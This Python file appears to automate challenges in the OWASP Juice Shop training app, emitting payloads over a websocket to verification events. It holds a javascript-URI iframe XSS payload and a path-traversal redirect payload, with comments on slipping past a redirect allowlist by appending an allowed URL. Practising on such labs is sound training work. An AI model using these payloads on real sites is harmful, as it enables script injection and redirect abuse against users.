from core.base_solver import BaseSolver
from loguru import logger
import time

class LocalXssSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "localXssChallenge"

    def solve(self) -> bool:
        payload = '<iframe src="javascript:alert(`xss`)">'
        self.client.connect_websocket()
        self.client.sio.emit('verifyLocalXssChallenge', payload)
        time.sleep(1) 
        self.client.disconnect_websocket()
        return True

class XssBonusSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "xssBonusChallenge"

    def solve(self) -> bool:
        payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
        self.client.connect_websocket()
        self.client.sio.emit('verifyLocalXssChallenge', payload)
        time.sleep(1)
        self.client.disconnect_websocket()
        return True

class CloseNotificationsSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "closeNotificationsChallenge"

    def solve(self) -> bool:
        payload = ["notification1", "notification2"]
        self.client.connect_websocket()
        self.client.sio.emit('verifyCloseNotificationsChallenge', payload)
        time.sleep(1)
        self.client.disconnect_websocket()
        return True

class SvgInjectionSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "svgInjectionChallenge"

    def solve(self) -> bool:
        # Regex: /.* \.\.\/\.\.\/\.\.[\w/-]*?\/redirect\?to=https?:\/\/placecats.com\/(g\/)?[\d]+\/[\d]+.*/
        # security.isRedirectAllowed(data) checks for redirectAllowlist.
        # Allowlist covers: 'https://github.com/juice-shop/juice-shop', etc.
        # We append an allowed URL as a dummy parameter.
        payload = "../../../redirect?to=https://placecats.com/100/100&white=https://github.com/juice-shop/juice-shop"
        self.client.connect_websocket()
        self.client.sio.emit('verifySvgInjectionChallenge', payload)
        time.sleep(1)
        self.client.disconnect_websocket()
        return True
